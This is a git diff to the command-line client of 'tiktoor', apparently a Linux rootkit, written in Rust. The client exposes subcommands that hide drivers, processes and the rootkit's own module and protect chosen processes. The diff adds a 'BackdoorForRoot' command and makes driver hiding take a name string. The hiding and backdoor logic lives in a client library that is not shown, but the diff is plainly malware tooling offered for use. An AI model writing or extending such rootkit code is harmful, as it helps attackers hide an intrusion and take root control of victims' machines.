@@ -1,3 +1,4 @@
+use std::ffi::CString;
 use structopt::StructOpt;
 
 /// A CLI tool for communicating with tiktoor
@@ -7,7 +8,7 @@ enum Cli {
     DriverHiding {
         /// driver name
         #[structopt(short, long)]
-        rank: u32,
+        name: String,
     },
     /// Hide file
     FileHiding,
@@ -29,18 +30,25 @@ enum Cli {
     ModuleHiding,
     /// Unhide tiktoor module
     ModuleUnhiding,
+    /// Backdoor for root
+    BackdoorForRoot,
 }
 
 fn main() {
     let cli = Cli::from_args();
 
     match cli {
-        Cli::DriverHiding { rank } => tiktoor_client::hide_driver(rank),
+        Cli::DriverHiding { name } => {
+            if let Ok(name) = CString::new(name) {
+                tiktoor_client::hide_driver(&name)
+            }
+        }
         Cli::FileHiding => {}
         Cli::PortHiding => {}
         Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
         Cli::ProcessProtection { pid } => tiktoor_client::protect_process(pid),
         Cli::ModuleHiding => tiktoor_client::hide_module(),
         Cli::ModuleUnhiding => tiktoor_client::unhide_module(),
+        Cli::BackdoorForRoot => tiktoor_client::backdoor_for_root(),
     }
 }
